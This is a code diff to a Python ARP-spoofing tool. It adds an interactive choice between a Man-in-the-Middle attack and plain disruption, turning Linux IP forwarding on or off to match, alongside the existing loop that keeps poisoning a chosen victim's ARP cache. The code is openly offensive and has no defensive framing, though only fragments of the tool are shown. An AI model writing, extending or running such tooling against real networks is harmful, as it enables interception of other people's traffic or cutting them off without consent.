@@ -12,6 +12,7 @@ from getmac import get_mac_address
 
 # Default variables
 settings={}
+settings["mitm"] = False
 settings["restore_arp_choice"] = False
 settings["VICTIM_MAC"] = "AA:AA:AA:AA:AA"
 settings["VICTIM_IP"] = "0.0.0.0"
@@ -24,8 +25,13 @@ settings["duckforce"] = False # Continously ARP poison the victims in order to n
 def start():
 
 	def arp(VICTIM_MAC, VICTIM_IP, duckforce):
-		print("\n Enabling IP Forwarding (MitM attack)...")
-		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+		if settings["mitm"]:
+			print("\n Enabling IP Forwarding (MitM attack)...")
+			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+		else:
+			# Disable ip forward
+			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		
 		while True:
 			#Poisoning the Victim
 			arp= Ether() / ARP()
@@ -91,7 +97,13 @@ def start():
 		choice = input()
 		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
 			settings["restore_arp_choice"] = True
-		print("\nWould you like to rrepeadedly poison the ARP of the victim? (Y/N)\n")
+		print ("\nWould you like to perform a Man-In-The-Middle (MitM) attack?(Y/N)\n [this enables Ip Forwarding]\n")
+		choice = input()
+		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
+			settings["mitm"] = True
+		else:
+			settings["mitm"] = False 
+		print("\nWould you like to repeadedly poison the ARP of the victim? (Y/N)\n")
 		choice = input()
 		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
 			settings["duckforce"] = True
@@ -145,7 +157,7 @@ if __name__ == '__main__':
 	try:
 		start()
 		if settings["restore_arp_choice"]:
-                    print("Restoring ARP caches of the infected Victims...")
+                    print("\n *** Restoring ARP caches of the infected Victims... ***")
                     restore_arp(settings["VICTIM_MAC"], settings['VICTIM_IP'])
 			
 	except KeyboardInterrupt:
